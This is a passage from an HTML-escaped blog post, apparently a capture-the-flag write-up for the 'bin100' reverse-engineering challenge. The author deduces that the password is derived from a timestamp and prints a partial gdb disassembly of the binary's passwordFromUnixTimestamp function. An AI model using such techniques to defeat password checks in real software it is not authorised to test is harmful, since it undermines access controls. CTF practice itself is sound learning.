+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bin100:&lt;&#x2F;span&gt;&lt;span&gt; ELF 64-bit LSB executable, x86-64, version 1 (SYSV)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; dynamically linked (uses shared libs)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; for GNU&#x2F;Linux 2.6.24, BuildID&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;sha1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;=0xea1b902c778ccf6e42b1ded0232847950d3768f0, not stripped
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; did not specify any password as part of the argument.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Try&lt;&#x2F;span&gt;&lt;span&gt; again.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I had two ideas:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Either Disassemble the program to find where it compares the user input with its internal password.&lt;&#x2F;li&gt;
+&lt;li&gt;Or guess or deduce the password based on some clues.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;I chose the second approach because of the information provided:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&quot;This file was created sometime between 14th March 2014, 8:20 PM, and 14th March 2014, 8:40 PM (Indian Standard Time).&quot;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;It’s obvious that the password must be related to this time. So, I launched &lt;em&gt;dissy&lt;&#x2F;em&gt; to check what functions the program uses (or calls).&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;1.bp.blogspot.com&#x2F;-a1dSM_VQQ9g&#x2F;UzBNRg4RjCI&#x2F;AAAAAAAAACg&#x2F;XpJx7FsBvBc&#x2F;s1600&#x2F;writeup2.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;And I saw this interesting function called passwordFromUnixTimestamp(long),&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;asm&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-asm &quot;&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(gdb) disassemble passwordFromUnixTimestamp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;Dump of assembler code for function _Z25passwordFromUnixTimestampl:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fb4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;push   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fb5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsp&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fb8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;push   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fb9 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;sub    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a8&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi&lt;&#x2F;span&gt;&lt;span&gt;,-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fc7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsi&lt;&#x2F;span&gt;&lt;span&gt;,-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1b0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fce &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x8&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;esi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fd3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;edi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fd8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;36&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x40141d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_zstorst13_ios_openmodes_&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fdd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;eax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;edx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fdf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;43&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fe6 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;edx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;esi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400fe8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400feb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;55&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400df0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSt18basic_stringstreamIcSt11char_traitsIcESaIcEEC1ESt13_Ios_Openmode@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400ff0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1b0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400ff7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000400ffe &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;add    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401002 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401005 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;81&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401008 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;84&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400d10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSolsEl@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040100d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;89&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span&gt;---&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;Type &amp;lt;return&amp;gt; to continue&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;q &amp;lt;return&amp;gt; to quit&lt;&#x2F;span&gt;&lt;span&gt;---
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401011 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;93&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401018 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040101b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;103&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040101e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;106&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400ea0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNKSt18basic_stringstreamIcSt11char_traitsIcESaIcEE3strEv@plt&amp;gt;
